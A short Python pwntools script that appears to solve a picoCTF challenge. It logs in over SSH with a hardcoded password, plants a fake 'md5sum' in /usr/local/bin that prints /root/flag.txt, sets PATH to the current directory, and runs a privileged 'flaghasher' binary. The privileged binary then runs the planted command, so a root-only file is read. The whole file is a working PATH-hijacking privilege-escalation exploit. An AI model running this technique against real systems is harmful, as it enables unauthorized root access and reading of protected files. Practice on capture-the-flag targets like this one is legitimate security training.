from pwn import *

PORT = 51357
s = ssh(user='ctf-player', host='rescued-float.picoctf.net', port=PORT, password='483e80d4')
sh = s.shell('bash --noprofile')
sh.sendline('cd /usr/local/bin')
sh.sendline('echo "/usr/bin/cat /root/flag.txt" > md5sum')
sh.sendline('chmod +x md5sum')
sh.sendline('PATH=.')
sh.sendline('./flaghasher')
flag = sh.recvuntil('}').decode().strip().split('\n')[-1]
print(flag)